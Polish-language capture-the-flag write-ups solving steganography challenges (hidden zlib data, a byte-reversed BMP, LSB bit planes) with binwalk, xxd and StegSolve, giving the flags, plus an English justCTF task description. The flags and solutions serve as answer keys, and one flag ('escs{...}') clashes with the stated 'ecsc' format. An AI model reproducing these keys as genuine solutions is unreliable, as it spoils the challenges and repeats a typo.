# Easy Volos (stego)
## Pts: 100

```
Great Volos - god of magic is around you. Just look carefully.

Format flagi: ecsc{litery_cyfry_i_znaki_specjalne}.
```
![volos](volos.png)

Dostajemy tylko plik `volos.png` (widoczny powyżej). Odpalamy binwalka z opcją `-e` (czyli `extract`):
```
$ binwalk -e volos.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 288 x 479, 8-bit/color RGBA, non-interlaced
41            0x29            Zlib compressed data, best compression
381077        0x5D095         Zlib compressed data, default compression
```

Pod offsetem `0x5d095` znajduje się skompresowany plik, który binwalk rozpakował do `volos.png.extracted/5D095`:

```
####################################################
####################################################
####################################################
####################################################
####################################################
########     ecsc{inflat3_or_d3flate}      #########
####################################################
####################################################
####################################################
####################################################
####################################################
```

I cyk zadanie rozwiązane.


### File: writeups/hack.cert/stegano/ignite the seeds/Readme.md

# Ignite the seeds (stego)
## Pts: 50

```
During our trip to Sniardwy lake we got lost and our GPS is broken. We have a map but our brains cannot parse it. Help us to find the way!

task.bmp

Format flagi: ecsc{litery_cyfry_i_znaki_specjalne}.
```

Dostajemy plik o rozszerzeniu `.bmp` ale nie da się go normalnie otworzyć. Możemy zajrzeć do środka hex edytorem (lub zwykłym `xxd`), być może rozpoznamy z czym mamy do czynienia.

```
$ xxd -i task.bmp | head -n 20
00000000: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000010: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000020: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000030: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000040: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000050: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000060: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000070: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000080: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000090: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000a0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000b0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000c0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000d0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000f0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000100: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000110: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000120: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000130: ffff ffff ffff ffff ffff ffff ffff ffff  ................
```

Niezbyt ciekawe, zobaczmy z drugiej strony:

```
$ xxd task.bmp | tail -n 5
000bb830: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000bb840: 7352 4742 0000 0000 0000 0000 0000 0b13  sRGB............
000bb850: 0000 0b13 000b b800 0000 0000 0018 0001  ................
000bb860: 0000 0190 0000 0280 0000 006c 0000 007a  ...........l...z
000bb870: 0000 0000 000b b87a 4d42                 .......zMB
```

`MB` to `BM` od tyłu, co jest magiczną liczbą właśnie dla formatu BMP. Odwróćmy zatem cały plik.

```
$ < task.bmp xxd -p -c1 | tac | xxd -p -r > out.bmp

$ file out.bmp
out.bmp: PC bitmap, Windows 95/NT4 and newer format, 640 x 400 x 2
```

![out.bmp](out.bmp)

Reszta jest raczej oczywista.


### File: writeups/hack.cert/stegano/learn some basics/Readme.md

# Learn Some Basics (stego)
## Pts: 50

```
Help the doggo Learn Some Basics of steganography.
Format flagi: ecsc{litery_cyfry_i_znaki_specjalne}.
```

Jedyny materiał to zdjęcie pieseła. Początkowy rekonesans nie pokazuje żadynch anomalii.

```
$ file help_the_doggo.png
help_the_doggo.png: PNG image data, 720 x 720, 8-bit/color RGBA, non-interlaced

$ binwalk help_the_doggo.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 720 x 720, 8-bit/color RGBA, non-interlaced
123           0x7B            Zlib compressed data, best compression

$ pnginfo help_the_doggo.png
help_the_doggo.png...
  Image Width: 720 Image Length: 720
  Bitdepth (Bits/Sample): 8
  Channels (Samples/Pixel): 4
  Pixel depth (Pixel Depth): 32
  Colour Type (Photometric Interpretation): RGB with alpha channel
  Image filter: Single row per byte filter
  Interlacing: No interlacing
  Compression Scheme: Deflate method 8, 32k window
  Resolution: 2835, 2835 (pixels per meter)
  FillOrder: msb-to-lsb
  Byte Order: Network (Big Endian)
  Number of text strings: 1 of 9
    Comment (unknown compression): bork
```

W takim razie wrzucamy obrazek w znane i lubiane narzędzie StegSolve. Prawie natychmiast odkrywamy że informacje są zakodowane w LSB każdego bajtu koloru.

![red plane 0](red.png)
![green plane 0](green.png)
![blue plane 0](blue.png)

Flaga: `escs{wow_much_crypto_very_secure}`


### File: writeups/justCTF 2019/STEGANO_catto/Description.md

### catto

We suspect this picture may hide some secret data, but they seem to be scrambled. Let's see if you can recover it!

